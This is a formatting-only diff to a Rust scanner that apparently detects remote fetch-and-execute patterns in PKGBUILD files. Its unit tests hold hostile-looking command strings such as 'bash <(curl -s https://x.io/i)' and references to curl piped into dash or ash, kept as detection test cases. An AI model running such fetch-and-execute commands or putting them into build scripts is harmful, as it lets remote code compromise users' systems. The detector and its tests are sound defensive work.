@@ -53,7 +53,8 @@ lazy_static! {
 
 /// Trim trailing shell punctuation a URL regex may capture.
 fn clean_url(u: &str) -> String {
-    u.trim_end_matches([';', '&', ',', '.', '\\', '}']).to_string()
+    u.trim_end_matches([';', '&', ',', '.', '\\', '}'])
+        .to_string()
 }
 
 /// Detects remote fetch-and-execute and extracts the external URL(s).
@@ -96,8 +97,10 @@ impl RemoteExecAnalyzer {
                 continue;
             };
             let idx = phys_line - 1;
-            let urls: Vec<String> =
-                URL.find_iter(scan_line).map(|m| clean_url(m.as_str())).collect();
+            let urls: Vec<String> = URL
+                .find_iter(scan_line)
+                .map(|m| clean_url(m.as_str()))
+                .collect();
             let where_ = if in_install { " (install script)" } else { "" };
             let url_msg = if urls.is_empty() {
                 "an external source".to_string()
@@ -180,7 +183,11 @@ mod tests {
     #[test]
     fn detects_process_substitution() {
         let a = RemoteExecAnalyzer::new();
-        let f = a.scan("bash <(curl -s https://x.io/i)", Path::new("PKGBUILD"), false);
+        let f = a.scan(
+            "bash <(curl -s https://x.io/i)",
+            Path::new("PKGBUILD"),
+            false,
+        );
         assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"));
     }
 
@@ -193,7 +200,10 @@ mod tests {
             Path::new("PKGBUILD"),
             false,
         );
-        assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "continuation-split fetch|exec must be caught");
+        assert!(
+            f.iter().any(|x| x.id == "EXEC-REMOTE"),
+            "continuation-split fetch|exec must be caught"
+        );
     }
 
     #[test]
@@ -205,7 +215,10 @@ mod tests {
             Path::new("PKGBUILD"),
             false,
         );
-        assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "curl|dash must be caught");
+        assert!(
+            f.iter().any(|x| x.id == "EXEC-REMOTE"),
+            "curl|dash must be caught"
+        );
     }
 
     #[test]
@@ -217,7 +230,10 @@ mod tests {
             Path::new("PKGBUILD"),
             false,
         );
-        assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "curl|ash must be caught");
+        assert!(
+            f.iter().any(|x| x.id == "EXEC-REMOTE"),
+            "curl|ash must be caught"
+        );
     }
 
     #[test]
@@ -381,7 +397,10 @@ mod tests {
             "ruby -e \"puts 1\"",
         ] {
             let f = a.scan(cmd, Path::new("PKGBUILD"), false);
-            assert!(f.is_empty(), "interpreter without a fetch must not fire EXEC-REMOTE: {cmd} -> {f:?}");
+            assert!(
+                f.is_empty(),
+                "interpreter without a fetch must not fire EXEC-REMOTE: {cmd} -> {f:?}"
+            );
         }
     }
 
@@ -410,7 +429,10 @@ mod tests {
             "curl -fsSL https://example.com/x | busybox cat",
         ] {
             let f = a.scan(cmd, Path::new("PKGBUILD"), false);
-            assert!(f.is_empty(), "non-shell pipe target must not fire EXEC-REMOTE: {cmd} -> {f:?}");
+            assert!(
+                f.is_empty(),
+                "non-shell pipe target must not fire EXEC-REMOTE: {cmd} -> {f:?}"
+            );
         }
     }
 
@@ -450,7 +472,11 @@ mod tests {
     fn ignores_plain_download_without_exec() {
         // A source download (no exec) must not be flagged here; that's normal.
         let a = RemoteExecAnalyzer::new();
-        let f = a.scan("curl -O https://example.com/src.tar.gz", Path::new("PKGBUILD"), false);
+        let f = a.scan(
+            "curl -O https://example.com/src.tar.gz",
+            Path::new("PKGBUILD"),
+            false,
+        );
         assert!(f.is_empty());
     }
 }
